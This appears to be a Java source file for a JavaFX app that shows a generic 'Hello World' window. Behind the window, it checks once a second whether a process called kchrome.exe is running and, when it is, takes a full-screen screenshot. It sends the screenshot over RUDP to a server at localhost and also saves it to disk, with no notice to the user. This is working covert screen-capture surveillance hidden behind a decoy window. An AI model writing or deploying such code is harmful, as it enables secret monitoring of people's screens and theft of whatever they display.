package sample;

import fr.slaynash.communication.handlers.OrderedPacketHandler;
import fr.slaynash.communication.rudp.RUDPClient;
import fr.slaynash.communication.utils.NetUtils;
import javafx.application.Application;
import javafx.fxml.FXMLLoader;
import javafx.scene.Parent;
import javafx.scene.Scene;
import javafx.stage.Stage;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.net.InetAddress;
import java.net.SocketException;
import java.net.SocketTimeoutException;
import java.net.UnknownHostException;
import java.util.Timer;
import java.util.TimerTask;

public class Main extends Application {

    private static final String APPLICATION_NAME = "kchrome.exe";
    public static final InetAddress SERVER_HOST = NetUtils.getInternetAdress("localhost");
    public static final int SERVER_PORT = 56448;

    public static RUDPClient client;

    @Override
    public void start(Stage primaryStage) throws Exception {
        openDialog(primaryStage);
        initServer();
        startCapturingScreen();
    }

    private void initServer() {
        try {
            client = new RUDPClient(SERVER_HOST, SERVER_PORT);
            client.setPacketHandler(OrderedPacketHandler.class);
            client.connect();
        }
        catch(SocketException e) {
            System.out.println("Cannot allow port for the client. Client can't be launched.");
            System.exit(-1);
        }
        catch(UnknownHostException e) {
            System.out.println("Unknown host: " + SERVER_HOST);
            System.exit(-1);
        }
        catch(SocketTimeoutException e) {
            System.out.println("Connection to " + SERVER_HOST + ":" + SERVER_PORT + " timed out.");
        }
        catch (InstantiationException e) {} //Given handler class can't be instantiated.
        catch (IllegalAccessException e) {} //Given handler class can't be accessed.
        catch(IOException e) {}
    }

    private void startCapturingScreen() {
        TimerTask task = new TimerTask() {
            @Override
            public void run() {
                try {
                    if (isDesiredApplicationIsRunning())
                        client.sendPacket(takeScreenShot()); //Send packet to the server
//                    client.sendReliablePacket(new byte[]{0x00}); //Send packet to the server
                    client.disconnect(); //Disconnect from server
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        };
        Timer timer = new Timer();
        long delay = 1000L;
        timer.scheduleAtFixedRate(task, delay, delay);
    }

    private byte[] takeScreenShot() {
        byte[] empty = new byte[0];
        try {
            Robot robot = new Robot();
            String format = "png";
            String fileName = "FullScreenshot." + format;

            Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
            BufferedImage screenFullImage = robot.createScreenCapture(screenRect);
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ImageIO.write( screenFullImage, format, baos );
            baos.flush();
            byte[] imageInByte = baos.toByteArray();
            baos.close();
            ImageIO.write(screenFullImage, format, new File(fileName));
            System.out.println("A full screenshot saved!");
            return imageInByte;
        } catch (AWTException | IOException ex) {
            System.err.println(ex);
        }
        return empty;
    }

    private boolean isDesiredApplicationIsRunning() throws IOException {
        String line;
        StringBuilder pidInfo = new StringBuilder();
        Process p = Runtime.getRuntime().exec(System.getenv("windir") + "\\system32\\" + "tasklist.exe");
        BufferedReader input = new BufferedReader(new InputStreamReader(p.getInputStream()));
        while ((line = input.readLine()) != null) {
            pidInfo.append(line);
        }
        input.close();
        return pidInfo.toString().toLowerCase().contains(APPLICATION_NAME);
    }

    private void openDialog(Stage primaryStage) throws IOException {
        Parent root = FXMLLoader.load(getClass().getResource("sample.fxml"));
        primaryStage.setTitle("Hello World");
        primaryStage.setScene(new Scene(root, 300, 275));
        primaryStage.show();
    }

    public static void main(String[] args) {
        launch(args);
    }
}
